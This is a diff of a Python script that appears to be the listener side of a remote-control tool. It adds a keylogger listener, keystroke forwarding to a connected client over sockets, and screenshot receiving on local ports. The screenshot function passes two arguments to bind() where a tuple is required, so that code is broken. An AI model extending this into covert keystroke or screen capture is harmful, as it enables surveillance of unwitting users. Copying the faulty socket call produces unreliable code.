@@ -2,10 +2,10 @@ import socket
 from PIL import Image, ImageTk
 import tkinter as tk
 import io
-def start_server():
-    host = '127.0.0.1'
-    port = 1234
-
+import keyboard
+host = '127.0.0.1'
+def start_keylogger_listener():
+    port = 5000
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.bind((host, port))
         s.listen(1)
@@ -24,9 +24,24 @@ def start_server():
 
 
         print("Client disconnected.")
+def start_keyboard_control():
+    port = 5001
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.bind((host,port))
+    server_socket.listen(5)
+    print(f"Listening on {host}:{port}")
+    client_socket, client_addr = server_socket.accept()
+    print(f"Connection established with {client_addr}")
+    while True:
+        key = keyboard.read_event()
+        if key.event_type == keyboard.KEY_DOWN:
+            key_name = key.name
+            print(f"Key pressed: {key_name}")
+            message = key_name
+            client_socket.sendall(message.encode())
+
 def receive_screenshot():
-    host = '127.0.0.1'
-    port = 12345
+    port = 5003
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server_socket.bind(host,port)
     server_socket.listen(5)
@@ -39,6 +54,9 @@ def receive_screenshot():
             picture_bytes += data
 
 
-
-start_server()
-#receive_screenshot()
+def main():
+    start_keyboard_control()
+    #start_keylogger_listener()
+    #receive_screenshot()
+if __name__ == "__main__":
+     main()
